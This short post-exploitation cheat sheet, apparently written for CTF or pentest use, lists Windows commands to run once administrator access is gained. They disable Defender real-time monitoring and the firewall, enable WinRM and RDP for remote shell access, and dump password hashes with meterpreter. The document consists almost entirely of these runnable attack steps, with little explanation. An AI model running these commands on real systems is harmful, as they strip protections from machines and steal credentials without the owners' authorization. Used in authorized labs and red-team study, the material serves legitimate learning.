Once we have a RDP session or a session as Administrator:

> **Disable Defender:**

```
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"
```

If this dosent work then tamper protection is on so we need to do it from the Windows Security application from the GUI.

> **Disable Firewall:**

```
netsh advfirewall set allprofiles state off
```

> Once these are done we can enable winrm so we can login using Evil-winrm or wmiexec to get a remote shell for our flag display:

```
winrm quickconfig -q
```

> **Enable RDP for GUI access:**

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

> **Dump hashes:**

If we have a meterpreter session we can dump hashes via meterpreter:

```
hashdump
```
